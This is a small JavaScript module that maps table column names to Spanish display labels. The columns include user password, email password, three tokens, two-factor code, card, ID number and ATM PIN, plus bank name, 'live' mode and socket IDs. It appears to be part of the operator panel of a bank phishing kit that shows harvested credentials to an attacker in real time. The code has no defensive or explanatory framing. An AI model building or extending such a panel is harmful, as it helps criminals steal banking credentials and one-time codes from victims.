const listFiltered = ['nameBank', 'liveData', 'userRef', '__v', 'additionalData', 'socketID', 'modeLive', 'isLiveLoading']
const traductionFiltered = {
    username: 'USUARIO',
    password: 'CLAVE',
    correo: 'CORREO',
    claveCorreo: 'CLAVE CORREO',
    celular: 'CELULAR',
    token1: 'TOKEN 1',
    token2: 'TOKEN 2',
    token3: 'TOKEN 3',
    factor: '2FACTOR',
    tarjeta: 'TARJETA',
    typeDocument: 'TIPO DOCUMENTO',
    nroDocument: 'DNI',
    online: 'CONECTADO',
    image: 'IMAGEN',
    atmPassword: 'ATM',
    method: 'METODO',   
    ip: 'IP'
}
export const tableHeaderFilter = (arrHeader) => arrHeader.map( e => {
    // if(e == 'ip') return null
    return listFiltered.includes(e) ? false : [e, traductionFiltered[e] ?? e] 
}).filter(e => e)